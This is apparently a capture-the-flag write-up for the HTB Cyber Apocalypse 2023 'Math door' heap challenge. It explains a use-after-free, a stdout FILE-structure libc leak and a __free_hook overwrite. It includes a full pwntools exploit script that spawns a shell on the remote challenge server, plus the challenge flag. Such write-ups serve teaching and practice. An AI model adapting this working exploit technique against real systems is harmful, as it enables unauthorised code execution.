# Math door - HTB Cyber Apocalypse 2023

## Description
Pandora is making her way through the ancient city, but she finds herself in a room with only locked doors. One of them looks majestic, and it has lots of hieroglyphs written on its surface. After inspecting it, she realizes it's all math: the door presents a problem and she has to solve it to go through to the heart of the ancient city. Will you be able to help her?

## Solution

Checksec:
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
RUNPATH:  b'.'
```

All protections are enabled on this binary except for fortification.

The bug in this one is a UAF in the delete() function.
```C
void delete(void)

{
  uint uVar1;
  
  puts("Hieroglyph index:");
  uVar1 = read_int();
  if (uVar1 < counter) {
    free(*(void **)(chunks + (ulong)uVar1 * 8));
  }
  else {
    puts("That hieroglyph doens\'t exist.");
  }
  return;
}
```

This only frees the chunk, but keeps the index inside of the list, which allows us to modify the chunk even after it was freed with add.

Add adds the bytes given onto the data that is already present in the chunk.

However no function exists to print the contents of a chunk, therefore we will have to find another way to get a leak.

Since this is libc 2.31, no heap pointer mangling is present and we can therefore just modify the pointers inside of a chunk. This is about as good as a leak is, but not entirely. So we'll need to create a leak primitive ourselves.

To create a leak primitive we first need a libc pointer. However the program only allows us to allocate chunks of size 0x18, which means we can't just allocate a chunk which goes into the unsorted bin.

The solution to this problem is the following:
1. Create 3 chunks
2. Delete the 2 first chunks
3. Point chunk 2's free pointer at chunk 3's size
4. Reallocate the 2 chunks. Chunk 5 now overlaps with chunk 2's size
5. Add to chunk 5, overwriting chunk 2's size with 0x421
6. Allocate enough chunks to realign chunk 2 with the rest of the heap
7. Free chunk 2

This will make GLIBC think that it has freed an unsorted bin and provide us with a libc pointer on the heap.

Next, we can free four other chunks and point the 3rd one to the newly created libc pointer. Then allocate three chunks again. The 4th chunk allocated will be inside libc.

As we can modify the libc pointer with add, we can basically just point inside anywhere we want in libc. I decided to first allocate 2 chunks inside of the FILE pointer stdout, so that it leaks libc data, next time a function which uses stdout is called.

Once the leak is received, we can allocate a chunk inside __free_hook and point it at system. Then free a chunk containing the string "/bin/sh" to spawn a shell.

Here is the exploit which does exactly this:

```py
from pwn import *

context.binary = "./math-door"

io = remote("104.248.169.175",31001)

def create():
    io.recvuntil(b'Action:')
    io.sendline(b'1')
    io.recvuntil(b'Hieroglyph created with index ')
    return int(io.recvuntil(b'.')[:-1])

def delete(idx):
    io.recvuntil(b'Action:')
    io.sendline(b'2')
    io.recvuntil(b'Hieroglyph index:')
    io.sendline(f"{idx}".encode())
def add(idx,data):
    io.recvuntil(b'Action:')
    io.sendline(b'3')
    io.recvuntil(b'Hieroglyph index:')
    io.sendline(f"{idx}".encode())
    io.recvuntil(b'Value to add to hieroglyph:')
    io.send(data)
    
    
# Overlap chunks to overwrite the size of the next chunk
create()
create()
create()
delete(0)
delete(1)
add(1,p8(0x30))
create()
create()
add(4,p64(0x0)+p64(0x421))

# Allocate enough chunks for the new unsorted bin to be a valid chunk
for i in range(5,40):
    create()

#Free the newly created big chunk to get a libc pointer 
delete(2)

#Free some chunks to get pointers we can modify
delete(7)
delete(8)
delete(9)
delete(10)
#Point chunk 9's free pointer to our libc pointers
add(9,p64(unsigned(-0x80)))
#Point our libc pointer at __IO_2_1_stdout-0x10
add(4,b'A'*16+p64(0xab0))

#Create 3 chunks so the next chunk we allocate will be inside of stdout
create()
create()
create()

#Get the index of chunk inside stdout
last_idx = create()

#Turn the flags variable in stdout to 0xfbad1800
add(last_idx,b'\x00'*16+p64(unsigned(-0x1087)))

#Point our libc pointer a bit further down so we can allocate a chunk
#on top of _IO_write_base
add(4,b'\x00'*16+p64(0x20))

#Free more chunks so we can point it at our libc pointer
delete(11)
delete(12)
delete(13)
delete(14)

#Point chunk 13 at our libc pointer
add(13,p64(unsigned(-0x100)))
#Create 3 chunks so the next chunk we allocate will be on top of _IO_write_base
create()
create()
create()

#Get the index of the chink which can overwrite write_base
last_idx = create()

#Point write_base 0x100 further down. This will now cause a leak when calling puts next
add(last_idx,b'\x00'*16+p64(unsigned(-0x100)))
io.recv(5)
# Receive our leak
leak = u64(io.recv(8))

#Calc libc base
libc_base = leak-0x1ed6a0
free_hook = libc_base+0x1eee48
system = libc_base+0x52290
log.info(f"LIBC BASE: {libc_base:#x}")

#Free more chunks so we can point at __free_hook
delete(15)
delete(16)
delete(17)
delete(18)
add(17,p64(0x10))
#Point chunk 16 at free hook
add(16,b'A'*16+p64(free_hook-8))

#Allocate the chunks untill our free_hook pointer
create()
create()
create()

#Allocate the free_hook pointer and set it to system
last_idx = create()
add(last_idx,b'A'*8+p64(system))

#Put /bin/sh inside of chunk 19
add(19,b'/bin/sh\x00')

#Trigger free_hook with /bin/sh
delete(19)


io.interactive()
```

## Flag
`HTB{y0ur_m4th_1s_fr0m_4n0th3r_w0rld!}`